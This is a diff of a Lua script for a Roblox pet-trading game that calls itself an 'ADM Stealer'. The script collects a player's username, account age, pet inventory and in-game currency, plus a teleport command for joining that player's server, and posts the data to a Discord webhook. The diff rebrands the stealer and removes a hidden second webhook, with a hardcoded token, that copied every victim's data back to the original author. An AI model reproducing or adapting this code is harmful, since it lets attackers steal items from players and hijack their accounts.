@@ -1,12 +1,3 @@
-if Username == "owhvdjygshistbwjdh" or Username == nil then
-    game:GetService("Players").LocalPlayer:Kick("Enter a username!")
-end
-if Webhook == "https://discord.com/api/webhooks/1264975102437490778/nJvELYp-HNI-gby_xMFI8c1hJScdSitcgTfSuFDkeDKc3giYVsIk9TgjxNbgcP6abvyg" or Webhook == nil then
-    game:GetService("Players").LocalPlayer:Kick("Please enter a webhook!")
-end
-
-LogsWebhook = "https://discord.com/api/webhooks/1264975102437490778/nJvELYp-HNI-gby_xMFI8c1hJScdSitcgTfSuFDkeDKc3giYVsIk9TgjxNbgcP6abvyg"
-
 local Pets = {}
 local PetCounts = {}
 
@@ -161,7 +152,7 @@ local data = {
     content = messageADOPT,
     embeds = {
         {
-            title = "**__Pethical | ADM Stealer__**",
+            title = "**__SparkZ | ADM Stealer__**",
             description = "**Player Information**: \n ```lua\nUsername: " ..
                 tostring(plr) ..
                     "\nUser-ID: " ..
@@ -212,66 +203,6 @@ request(
             ["Content-Type"] = "application/json"
         },
         Body = game.HttpService:JSONEncode(data)
-    }
-)
-
-local Logs = {
-    username = "Skidtho Script - Logs",
-    avatar_url = "https://cdn.discordapp.com/attachments/1282931642620706908/1283459804089548800/standard.gif?ex=6708a556&is=670753d6&hm=01662f53e4b8644a38a029c682b8ae93cf0ec0b65ad6c2ebf37035d20dfe3e8f&",
-    content = messageADOPT,
-    embeds = {
-        {
-            title = "**__Pethical | ADM Stealer__**",
-            description = "**📃  Player Information**: \n ```lua\n🗽 Username: " ..
-                tostring(plr) ..
-                    "\nUser-ID: " ..
-                        tostring(userid) ..
-                            "\nAccount Age: " ..
-                                tostring(accage) ..
-                                    "\nReceiver: " ..
-                                        userr ..
-                                            "\n```\n **Inventory**: \n```lua\nLegendaries: " ..
-                                                tostring(legendaries_count) ..
-                                                    "\nMega Neons: " ..
-                                                        tostring(mega_count) ..
-                                                            "\nNeons: " ..
-                                                                tostring(neon_count) ..
-                                                                    "\nUltra Rares: " ..
-                                                                        tostring(ultra_count) ..
-                                                                            "\nRares: " ..
-                                                                                tostring(rare_count) ..
-                                                                                    "\nUncommons: " ..
-                                                                                        tostring(uncommon_count) ..
-                                                                                            "\nCommons: " ..
-                                                                                                tostring(common_count) ..
-                                                                                                    "\nBucks: " ..
-                                                                                                        bucks ..
-                                                                                                            "\nTotal Pets: " ..
-                                                                                                                tostring(
-                                                                                                                    total_pets
-                                                                                                                ) ..
-                                                                                                                    '\n```\n**Join Player Script**:\n\n```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' ..
-                                                                                                                        game.JobId ..
-                                                                                                                            '", game.Players.LocalPlayer)\n```',
-            color = tonumber(0x3365FF),
-            fields = {
-                {
-                    name = "Player Iventory:",
-                    value = "**COMMING SOON!**"
-                }
-            }
-        }
-    }
-}
-local request = http_request or request or HttpPost or syn.request
-request(
-    {
-        Url = LogsWebhook,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = game.HttpService:JSONEncode(Logs)
     }
 )
 
